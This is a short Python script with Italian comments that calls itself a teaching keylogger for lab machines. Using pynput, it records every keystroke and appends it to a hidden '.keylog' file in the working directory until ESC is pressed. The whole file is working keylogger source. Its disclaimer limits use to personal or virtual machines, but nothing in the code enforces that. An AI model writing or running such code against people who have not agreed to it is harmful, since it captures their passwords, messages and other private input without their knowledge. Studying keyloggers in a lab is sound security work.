#!/usr/bin/env python3
"""
Keylogger Didattico per Ambienti di Test
----------------------------------------
⚠️ Da usare solo su macchine personali / laboratori virtuali.

Registra i tasti premuti e li salva nel file .keylog nella cartella corrente.
Premi CTRL+C o ESC per interrompere.
"""
# sudo python3 keylogger.py
from pynput import keyboard
from pathlib import Path
import sys

# file .keylog nella cartella corrente (working directory)
LOG_FILE = Path.cwd() / ".keylog"

def on_press(key):
    try:
        # normalizza la rappresentazione del tasto
        if hasattr(key, 'char') and key.char is not None:
            s = key.char
        else:
            s = f"[{key}]"
        # scrivi e forzi il flush per sicurezza
        with LOG_FILE.open("a", encoding="utf-8", errors="ignore") as f:
            f.write(s)
            f.flush()
        # se vuoi vedere i tasti a video per debug, decommenta:
        # print(s, end="", flush=True)
    except Exception as e:
        print(f"Errore durante la scrittura: {e}", file=sys.stderr)

def on_release(key):
    # ESC per terminare
    if key == keyboard.Key.esc:
        print("\n[!] Terminazione del keylogger...")
        return False

if __name__ == "__main__":
    print(f"[+] Keylogger avviato — log in: {LOG_FILE}")
    print("[!] Premi ESC per fermarlo (o CTRL+C)")
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[!] Interrotto da tastiera.")
    except Exception as e:
        print(f"[!] Errore: {e}", file=sys.stderr)
